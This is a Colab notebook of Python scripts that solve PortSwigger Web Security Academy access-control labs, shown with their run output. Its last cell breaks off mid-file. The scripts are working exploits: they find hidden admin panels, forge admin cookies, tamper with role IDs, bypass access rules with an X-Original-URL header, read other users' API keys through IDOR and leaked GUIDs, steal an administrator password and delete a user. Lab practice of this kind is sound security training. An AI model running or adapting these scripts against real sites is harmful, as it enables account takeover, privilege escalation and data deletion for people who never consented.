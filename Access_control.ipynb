{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOAK4FdcxusKZoou7pXp88B",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/himuethic/Access-control-/blob/main/Access_control.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "dNOec1X7au3n",
        "outputId": "e2bb9d4e-7d06-4dbf-8601-52e800d8e3e4"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Finding admin panel...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.10/dist-packages/urllib3/connectionpool.py:1100: InsecureRequestWarning: Unverified HTTPS request is being made to host '0aa3005403f3b5e7806bdf58001700d3.web-security-academy.net'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings\n",
            "  warnings.warn(\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Found the administrator panel!\n",
            "(+) Deleting Carlos user...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.10/dist-packages/urllib3/connectionpool.py:1100: InsecureRequestWarning: Unverified HTTPS request is being made to host '0aa3005403f3b5e7806bdf58001700d3.web-security-academy.net'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings\n",
            "  warnings.warn(\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Carlos user deleted!\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.10/dist-packages/urllib3/connectionpool.py:1100: InsecureRequestWarning: Unverified HTTPS request is being made to host '0aa3005403f3b5e7806bdf58001700d3.web-security-academy.net'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings\n",
            "  warnings.warn(\n"
          ]
        }
      ],
      "source": [
        "import requests\n",
        "import sys\n",
        "\n",
        "def delete_user(url):\n",
        "    admin_panel_url = url + '/administrator-panel'\n",
        "    r = requests.get(admin_panel_url, verify=False)\n",
        "    if r.status_code == 200:\n",
        "        print('(+) Found the administrator panel!')\n",
        "        print('(+) Deleting Carlos user...')\n",
        "        delete_carlos_url = admin_panel_url + '/delete?username=carlos'\n",
        "        r = requests.get(delete_carlos_url, verify=False)\n",
        "        if r.status_code == 200:\n",
        "            print('(+) Carlos user deleted!')\n",
        "        else:\n",
        "            print('(-) Could not delete user.')\n",
        "    else:\n",
        "        print('(-) Administrator panel not found.')\n",
        "        print('(-) Exiting the script...')\n",
        "\n",
        "def main():\n",
        "    url = 'https://0aa3005403f3b5e7806bdf58001700d3.web-security-academy.net'\n",
        "    print(\"(+) Finding admin panel...\")\n",
        "    delete_user(url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "wDrISqb0bEFS"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import sys\n",
        "import urllib3\n",
        "from bs4 import BeautifulSoup\n",
        "import re\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def delete_user(url):\n",
        "    r = requests.get(url, verify=False)\n",
        "\n",
        "\n",
        "    session_cookie = r.cookies.get_dict().get('session')\n",
        "\n",
        "\n",
        "    soup = BeautifulSoup(r.text, 'lxml')\n",
        "    admin_instances = soup.find(text=re.compile(\"/admin-\"))\n",
        "    admin_path = re.search(\"href', '(.*)'\", admin_instances).group(1)\n",
        "\n",
        "    # Delete Carlos user\n",
        "    cookies = {'session': session_cookie}\n",
        "    delete_carlos_url = url + admin_path + '/delete?username=carlos'\n",
        "    r = requests.get(delete_carlos_url, cookies=cookies, verify=False)\n",
        "    if r.status_code == 200:\n",
        "        print('(+) Carlos user deleted!')\n",
        "    else:\n",
        "        print('(-) Deletion failed.')\n",
        "        print('(-) Exiting script...')\n",
        "        sys.exit(-1)\n",
        "\n",
        "def main():\n",
        "    url = 'https://0aa200a4047dd73581ed6177007a0043.web-security-academy.net'\n",
        "    print(\"(+) Deleting Carlos user...\")\n",
        "    delete_user(url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "PXocOUGhcDRZ",
        "outputId": "30947629-a97c-4f00-abaf-74082001d723"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Deleting Carlos user...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-2-92a3ce98a718>:17: DeprecationWarning: The 'text' argument to find()-type methods is deprecated. Use 'string' instead.\n",
            "  admin_instances = soup.find(text=re.compile(\"/admin-\"))\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Carlos user deleted!\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "bs-MYnyGkm5F"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "import requests\n",
        "import urllib3\n",
        "from bs4 import BeautifulSoup\n",
        "import re\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def get_csrf_token(s, url):\n",
        "    r = s.get(url, verify=False)\n",
        "    soup = BeautifulSoup(r.text, 'html.parser')\n",
        "    csrf = soup.find(\"input\", {'name': 'csrf'})['value']\n",
        "    return csrf\n",
        "\n",
        "def delete_user(s, url):\n",
        "\n",
        "    login_url = url + \"/login\"\n",
        "    csrf_token = get_csrf_token(s, login_url)\n",
        "\n",
        "    # Login as the wiener user\n",
        "    data = {\n",
        "        \"csrf\": csrf_token,\n",
        "        \"username\": \"wiener\",\n",
        "        \"password\": \"peter\"\n",
        "    }\n",
        "\n",
        "    r = s.post(login_url, data=data, verify=False)\n",
        "    res = r.text\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the wiener user.\")\n",
        "\n",
        "        # Retrieve the session cookie\n",
        "        my_account_url = url + \"/my-account\"\n",
        "        r = s.get(my_account_url, verify=False)\n",
        "        session_cookie = s.cookies.get_dict().get('session')\n",
        "\n",
        "        # Visit the admin panel and delete the user carlos\n",
        "        delete_carlos_user_url = url + \"/admin/delete?username=carlos\"\n",
        "        cookies = {'Admin': 'true', 'session': session_cookie}\n",
        "        r = s.get(delete_carlos_user_url, cookies=cookies, verify=False)\n",
        "        if r.status_code == 200:\n",
        "            print('(+) Successfully deleted Carlos user.')\n",
        "        else:\n",
        "            print('(-) Failed to delete Carlos user.')\n",
        "            print('Status Code:', r.status_code)\n",
        "            print('Response:', r.text)\n",
        "    else:\n",
        "        print(\"(-) Failed to login as the wiener user.\")\n",
        "        print('Response:', res)\n",
        "\n",
        "def main():\n",
        "    url = 'https://0a010012033eb51180bcf36600b2008f.web-security-academy.net'\n",
        "    s = requests.Session()\n",
        "    delete_user(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "JTJDWg23eCRC",
        "outputId": "056f27d7-03e6-47b1-e6d3-b32609715f44"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Successfully logged in as the wiener user.\n",
            "(-) Failed to delete Carlos user.\n",
            "Status Code: 401\n",
            "Response: <!DOCTYPE html>\n",
            "<html>\n",
            "    <head>\n",
            "        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n",
            "        <link href=/resources/css/labs.css rel=stylesheet>\n",
            "        <title>User role controlled by request parameter</title>\n",
            "    </head>\n",
            "    <body>\n",
            "        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n",
            "        <div id=\"academyLabHeader\">\n",
            "            <section class='academyLabBanner is-solved'>\n",
            "                <div class=container>\n",
            "                    <div class=logo></div>\n",
            "                        <div class=title-container>\n",
            "                            <h2>User role controlled by request parameter</h2>\n",
            "                            <a class=link-back href='https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter'>\n",
            "                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;\n",
            "                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>\n",
            "                                    <g>\n",
            "                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>\n",
            "                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>\n",
            "                                    </g>\n",
            "                                </svg>\n",
            "                            </a>\n",
            "                        </div>\n",
            "                        <div class='widgetcontainer-lab-status is-solved'>\n",
            "                            <span>LAB</span>\n",
            "                            <p>Solved</p>\n",
            "                            <span class=lab-status-icon></span>\n",
            "                        </div>\n",
            "                    </div>\n",
            "                </div>\n",
            "            </section>\n",
            "            <section id=notification-labsolved class=notification-labsolved>\n",
            "                <div class=container>\n",
            "                    <h4>Congratulations, you solved the lab!</h4>\n",
            "                    <div>\n",
            "                        <span>\n",
            "                            Share your skills!\n",
            "                        </span>\n",
            "                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aUser+role+controlled+by+request+parameter%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2faccess-control%2flab-user-role-controlled-by-request-parameter&related=WebSecAcademy,Burp_Suite'>\n",
            "                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>\n",
            "                        <title>twitter-button</title>\n",
            "                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>\n",
            "                    </svg>\n",
            "                        </a>\n",
            "                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2faccess-control%2flab-user-role-controlled-by-request-parameter'>\n",
            "                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'\n",
            "                        <title>linkedin-button</title>\n",
            "                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>\n",
            "                    </svg>\n",
            "                        </a>\n",
            "                        <a href='https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter'>\n",
            "                            Continue learning \n",
            "                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>\n",
            "                                <g>\n",
            "                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>\n",
            "                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>\n",
            "                                </g>\n",
            "                            </svg>\n",
            "                        </a>\n",
            "                    </div>\n",
            "                </div>\n",
            "            </section>\n",
            "        </div>\n",
            "        <div theme=\"\">\n",
            "            <section class=\"maincontainer\">\n",
            "                <div class=\"container is-page\">\n",
            "                    <header class=\"navigation-header\">\n",
            "                        <section class=\"top-links\">\n",
            "                            <a href=/>Home</a><p>|</p>\n",
            "                            <a href=\"/my-account?id=wiener\">My account</a><p>|</p>\n",
            "                        </section>\n",
            "                    </header>\n",
            "                    <header class=\"notification-header\">\n",
            "                    </header>\n",
            "                    Admin interface only available if logged in as an administrator\n",
            "                </div>\n",
            "            </section>\n",
            "            <div class=\"footer-wrapper\">\n",
            "            </div>\n",
            "        </div>\n",
            "    </body>\n",
            "</html>\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def delete_user(s, url):\n",
        "    # Login as the wiener user\n",
        "    login_url = url + \"/login\"\n",
        "    data_login = {\"username\": \"wiener\", \"password\": \"peter\"}\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the wiener user.\")\n",
        "\n",
        "        # Change the role id of the user\n",
        "        change_email_url = url + \"/my-account/change-email\"\n",
        "        data_role_change = {\"email\": \"test@test.ca\", \"roleid\": 2}\n",
        "        r = s.post(change_email_url, json=data_role_change, verify=False)\n",
        "        res = r.text\n",
        "        if 'Admin' in res:\n",
        "            print(\"(+) Successfully changed the role id.\")\n",
        "\n",
        "            # Delete the Carlos user\n",
        "            delete_carlos_user_url = url + \"/admin/delete?username=carlos\"\n",
        "            r = s.get(delete_carlos_user_url, verify=False)\n",
        "\n",
        "            if r.status_code == 200:\n",
        "                print(\"(+) Successfully deleted Carlos user.\")\n",
        "            else:\n",
        "                print(\"(-) Could not delete Carlos user.\")\n",
        "                print('Status Code:', r.status_code)\n",
        "                print('Response:', r.text)\n",
        "        else:\n",
        "            print(\"(-) Could not change the role id.\")\n",
        "            print('Response:', res)\n",
        "    else:\n",
        "        print(\"(-) Could not login as the wiener user.\")\n",
        "        print('Response:', res)\n",
        "\n",
        "def main():\n",
        "    url = 'https://0aac009c036a44e48065bcef005a0036.web-security-academy.net'\n",
        "    s = requests.Session()\n",
        "    delete_user(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6rLx2s3ueHkl",
        "outputId": "c070ab7b-f423-4f49-d856-3b2ae6bd9ee5"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Successfully logged in as the wiener user.\n",
            "(+) Successfully changed the role id.\n",
            "(+) Successfully deleted Carlos user.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def delete_user(s, url):\n",
        "    delete_carlos_user_url = url + \"/?username=carlos\"\n",
        "    headers = {\"X-Original-URL\": \"/admin/delete\"}\n",
        "    r = s.get(delete_carlos_user_url, headers=headers, verify=False)\n",
        "\n",
        "    # Verify if the user was deleted\n",
        "    r = s.get(url, verify=False)\n",
        "    res = r.text\n",
        "    if \"Congratulations, you solved the lab!\" in res:\n",
        "        print(\"(+) Successfully done.\")\n",
        "    else:\n",
        "        print(\"(-) Could not delete Carlos user.\")\n",
        "        print('Status Code:', r.status_code)\n",
        "        print('Response:', r.text)\n",
        "\n",
        "def main():\n",
        "    url = 'https://0a0c00a5044db2d1819f2f6900d10084.web-security-academy.net'\n",
        "    s = requests.Session()\n",
        "    delete_user(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gFEqe1b3h_CD",
        "outputId": "d21bb080-b5d9-443c-e135-4d0d2386f021"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Successfully done.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def promote_to_admin(s, url):\n",
        "\n",
        "    # login as the wiener user\n",
        "    login_url = url + \"/login\"\n",
        "    data_login = {\"username\": \"wiener\", \"password\": \"peter\"}\n",
        "\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the wiener user.\")\n",
        "\n",
        "        # Exploit access control vulnerability to promote the user to admin\n",
        "        admin_roles_url = url + \"/admin-roles?username=wiener&action=upgrade\"\n",
        "        r = s.get(admin_roles_url, verify=False)\n",
        "        res = r.text\n",
        "        if \"Admin panel\" in res:\n",
        "            print(\"(+) Successfully promoted the user to administrator.\")\n",
        "        else:\n",
        "            print(\"(-) Could not promote the user to administrator.\")\n",
        "            print('Status Code:', r.status_code)\n",
        "            print('Response:', r.text)\n",
        "    else:\n",
        "        print(\"(-) Could not login as the wiener user.\")\n",
        "        print('Response:', res)\n",
        "\n",
        "def main():\n",
        "    url = 'https://0ace00a7045ed754818184d300360092.web-security-academy.net'\n",
        "    s = requests.Session()\n",
        "    promote_to_admin(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "7p45dSWpkOJ2",
        "outputId": "5e7d3be9-277e-4fb7-8791-d34146747afa"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Successfully logged in as the wiener user.\n",
            "(+) Successfully promoted the user to administrator.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "from bs4 import BeautifulSoup\n",
        "import re\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def get_csrf_token(s, url):\n",
        "    r = s.get(url, verify=False)\n",
        "    soup = BeautifulSoup(r.text, 'html.parser')\n",
        "    csrf = soup.find(\"input\", {'name': 'csrf'})['value']\n",
        "    return csrf\n",
        "\n",
        "def carlos_api_key(s, url):\n",
        "    # Get CSRF token from login page\n",
        "    login_url = url + \"/login\"\n",
        "    csrf_token = get_csrf_token(s, login_url)\n",
        "\n",
        "    # Login as the wiener user\n",
        "    print(\"(+) Logging in as the wiener user...\")\n",
        "    data_login = {\"csrf\": csrf_token, \"username\": \"wiener\", \"password\": \"peter\"}\n",
        "\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the wiener user.\")\n",
        "\n",
        "        # Exploit access control vulnerability and access Carlos's account\n",
        "        carlos_url = url + \"/my-account?id=carlos\"\n",
        "        r = s.get(carlos_url, verify=False)\n",
        "        res = r.text\n",
        "        if \"carlos\" in res:\n",
        "            print(\"(+) Successfully accessed Carlos's account!\")\n",
        "            print(\"(+) Retrieving the API key...\")\n",
        "            api_key = re.search(\"Your API Key is:(.*)\", res).group(1)\n",
        "            print('API key is:' + api_key.split('</div>')[0].strip())\n",
        "        else:\n",
        "            print(\"(-) Could not access Carlos's account.\")\n",
        "    else:\n",
        "        print(\"(-) Could not login as the wiener user.\")\n",
        "\n",
        "def main():\n",
        "    url = 'https://0af100f903493b28818907f8006a0030.web-security-academy.net'\n",
        "    s = requests.Session()\n",
        "    carlos_api_key(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xZR0cS2wl8Km",
        "outputId": "5eebc1b4-12ff-4720-c46d-901fcfb92971"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Logging in as the wiener user...\n",
            "(+) Successfully logged in as the wiener user.\n",
            "(+) Successfully accessed Carlos's account!\n",
            "(+) Retrieving the API key...\n",
            "API key is:H0aNYMcZD3pSheGWmy4bF4sC6YLtJu4C\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "from bs4 import BeautifulSoup\n",
        "import re\n",
        "\n",
        "\n",
        "requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def get_csrf_token(s, url):\n",
        "    r = s.get(url, verify=False)\n",
        "    soup = BeautifulSoup(r.text, 'html.parser')\n",
        "    csrf = soup.find(\"input\", {'name': 'csrf'})['value']\n",
        "    return csrf\n",
        "\n",
        "def carlos_guid(s, url):\n",
        "    r = s.get(url, verify=False)\n",
        "    res = r.text\n",
        "    post_ids = re.findall(r'postId=(\\w+)\"', res)\n",
        "    unique_post_ids = list(set(post_ids))\n",
        "\n",
        "    for i in unique_post_ids:\n",
        "        r = s.get(url + \"/post?postId=\" + i, verify=False)\n",
        "        res = r.text\n",
        "        if 'carlos' in res:\n",
        "            print(\"(+) Found Carlos GUID...\")\n",
        "            guid = re.findall(r\"userId=(.*)'\", res)[0]\n",
        "            return guid\n",
        "\n",
        "def carlos_api_key(s, url):\n",
        "    login_url = url + \"/login\"\n",
        "    csrf_token = get_csrf_token(s, login_url)\n",
        "\n",
        "    data_login = {\"username\": \"wiener\", \"password\": \"peter\", \"csrf\": csrf_token}\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the wiener user.\")\n",
        "\n",
        "        guid = carlos_guid(s, url)\n",
        "\n",
        "        carlos_account_url = url + \"/my-account?id=\" + guid\n",
        "        r = s.get(carlos_account_url, verify=False)\n",
        "        res = r.text\n",
        "        if 'carlos' in res:\n",
        "            print(\"(+) Successfully accessed Carlos's account...\")\n",
        "            print(\"(+) Retrieving API key...\")\n",
        "            api_key = re.findall(r'Your API Key is:(.*)\\<\\/div>', res)\n",
        "            print('API key is: ' + api_key[0])\n",
        "        else:\n",
        "            print(\"(-) Could not access Carlos's account.\")\n",
        "    else:\n",
        "        print(\"(-) Could not login as the wiener user.\")\n",
        "\n",
        "def main():\n",
        "    url = \"https://0ad9001e04ea598581d3254000770065.web-security-academy.net\"\n",
        "\n",
        "    s = requests.Session()\n",
        "    carlos_api_key(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "iH2JjNonnwBC",
        "outputId": "fd561bb3-5f20-420d-d9fd-4d9d9d1b149f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Successfully logged in as the wiener user.\n",
            "(+) Found Carlos GUID...\n",
            "(+) Successfully accessed Carlos's account...\n",
            "(+) Retrieving API key...\n",
            "API key is:  gHjff92uyOzFJBJDrPYFyLY2RwiM1ak8\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "from bs4 import BeautifulSoup\n",
        "import re\n",
        "\n",
        "# Disable SSL warnings (not recommended for production)\n",
        "requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def get_csrf_token(s, url):\n",
        "    r = s.get(url, verify=False)\n",
        "    soup = BeautifulSoup(r.text, 'html.parser')\n",
        "    csrf = soup.find(\"input\", {'name': 'csrf'})['value']\n",
        "    return csrf\n",
        "\n",
        "def carlos_api_key(s, url):\n",
        "    # Get CSRF token from the login page\n",
        "    login_url = url + \"/login\"\n",
        "    csrf_token = get_csrf_token(s, login_url)\n",
        "\n",
        "    # Login as the wiener user\n",
        "    print(\"(+) Logging in as the wiener user...\")\n",
        "    data_login = {\"username\": \"wiener\", \"password\": \"peter\", \"csrf\": csrf_token}\n",
        "\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the wiener user.\")\n",
        "\n",
        "        # Access the Carlos account\n",
        "        print(\"(+) Attempting to exploit access control vulnerability...\")\n",
        "        carlos_account_url = url + \"/my-account?id=carlos\"\n",
        "        r = s.get(carlos_account_url, allow_redirects=False, verify=False)\n",
        "        res = r.text\n",
        "        if \"carlos\" in res:\n",
        "            print(\"(+) Retrieving API key...\")\n",
        "            api_key = re.findall(r'Your API Key is:(.*)\\<\\/div>', res)\n",
        "            print('API key is: ' + api_key[0])\n",
        "        else:\n",
        "            print(\"(-) Could not exploit access control vulnerability.\")\n",
        "    else:\n",
        "        print(\"(-) Could not login as the wiener user.\")\n",
        "\n",
        "def main():\n",
        "    url = \"https://0ae4002904a5598581962fe600b0004b.web-security-academy.net\"\n",
        "\n",
        "    s = requests.Session()\n",
        "    carlos_api_key(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "30OlcS9VoCIj",
        "outputId": "ae271b6e-e3e3-4a7b-b305-44acd08c3a15"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Logging in as the wiener user...\n",
            "(+) Successfully logged in as the wiener user.\n",
            "(+) Attempting to exploit access control vulnerability...\n",
            "(+) Retrieving API key...\n",
            "API key is:  8Wgr2WU8WxmDaDGMoZmGMdqeHoBD61WP\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "from bs4 import BeautifulSoup\n",
        "import re\n",
        "\n",
        "requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def get_csrf_token(s, url):\n",
        "    r = s.get(url, verify=False)\n",
        "    soup = BeautifulSoup(r.text, 'html.parser')\n",
        "    csrf = soup.find(\"input\", {'name': 'csrf'})['value']\n",
        "    return csrf\n",
        "\n",
        "def retrieve_admin_password(s, url):\n",
        "    login_url = url + \"/login\"\n",
        "    csrf_token = get_csrf_token(s, login_url)\n",
        "\n",
        "    print(\"(+) Logging in as the wiener user...\")\n",
        "    data_login = {\"username\": \"wiener\", \"password\": \"peter\", \"csrf\": csrf_token}\n",
        "\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the wiener user...\")\n",
        "\n",
        "        admin_account_url = url + \"/my-account?id=administrator\"\n",
        "        r = s.get(admin_account_url, verify=False)\n",
        "        res = r.text\n",
        "\n",
        "        if 'administrator' in res:\n",
        "            print(\"(+) Successfully accessed the administrator account...\")\n",
        "            print(\"(+) Retrieving the administrator password...\")\n",
        "            soup = BeautifulSoup(r.text, 'html.parser')\n",
        "            password = soup.find(\"input\", {'name': 'password'})['value']\n",
        "            return password\n",
        "        else:\n",
        "            print(\"(-) Could not access the administrator account.\")\n",
        "            sys.exit(-1)\n",
        "    else:\n",
        "        print(\"(-) Could not login as the wiener user.\")\n",
        "        sys.exit(-1)\n",
        "\n",
        "def delete_carlos_user(s, url, password):\n",
        "    login_url = url + \"/login\"\n",
        "    csrf_token = get_csrf_token(s, login_url)\n",
        "\n",
        "    print(\"(+) Logging in as the administrator user...\")\n",
        "    data_login = {\"username\": \"administrator\", \"password\": password, \"csrf\": csrf_token}\n",
        "\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the administrator user...\")\n",
        "\n",
        "        print(\"(+) Deleting Carlos user...\")\n",
        "        delete_carlos_url = url + \"/admin/delete?username=carlos\"  # Ensure this line is properly terminated\n",
        "        r = s.get(delete_carlos_url, verify=False)\n",
        "        if r.status_code == 200:\n",
        "            print(\"Successfully deleted the Carlos user.\")\n",
        "        else:\n",
        "            print(\"Could not delete the Carlos user.\")\n",
        "            sys.exit(-1)\n",
        "    else:\n",
        "        print(\"(-) Could not login as the administrator user.\")\n",
        "        sys.exit(-1)\n",
        "\n",
        "def main():\n",
